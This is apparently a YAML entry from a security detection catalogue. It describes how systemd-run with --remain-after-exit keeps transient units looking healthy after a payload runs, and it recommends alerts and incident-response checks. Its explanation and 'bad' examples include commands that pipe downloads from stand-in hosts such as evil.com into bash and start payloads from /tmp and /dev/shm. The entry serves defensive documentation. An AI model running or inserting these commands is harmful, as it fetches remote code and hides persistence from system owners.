id: "persistence-evasion/transient-persistence/systemd-run-persist"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Transient Systemd Persistence"
category_id: "6.11"
name: "Persistent systemd Transient Service"
risk_level: "high"

abstract: |
  Using systemd-run with --remain-after-exit to create a transient service that stays
  'active' even after the process exits, maintaining presence without a running daemon.
  This keepalive pattern makes incident response harder because the unit appears healthy
  in systemctl even after the payload completes.

explanation: |
  The `--remain-after-exit` flag keeps the transient unit in an 'active (exited)' state
  after its main process terminates:

  ```
  systemd-run --remain-after-exit /tmp/payload.sh
  systemd-run --user --remain-after-exit sh -c 'curl https://c2.com/stage1 | bash'
  systemd-run --remain-after-exit --on-active=5min /tmp/beacon.sh
  ```

  The persistence mechanism works as follows:
  1. Payload executes and completes (downloads next stage, establishes C2)
  2. Unit remains in `active (exited)` state
  3. `systemctl stop <unit>` is required to clean it up — `systemctl` alone shows it as healthy
  4. Operators checking for running processes won't find the payload (it already exited)
  5. The unit entry in systemd state masks the fact that something ran

  This is often combined with exfiltration or staging payloads where the payload runs
  once, completes its work, and the --remain-after-exit flag leaves the evidence of
  "normal operation."

recommendation: |
  - Block systemd-run with --remain-after-exit combined with suspicious commands.
  - Alert on transient units in 'active (exited)' state that weren't created by known processes.
  - Include `systemctl list-units --state=exited` in incident response playbooks.
  - Correlate transient unit creation events with network connections in the same timeframe.

examples:
  bad:
    - "systemd-run --remain-after-exit /tmp/payload.sh"
    - "systemd-run --user --remain-after-exit sh -c 'curl https://evil.com | bash'"
    - "systemd-run --remain-after-exit --user /dev/shm/stage1"
  good:
    - "systemd-run --scope --remain-after-exit /usr/bin/make"

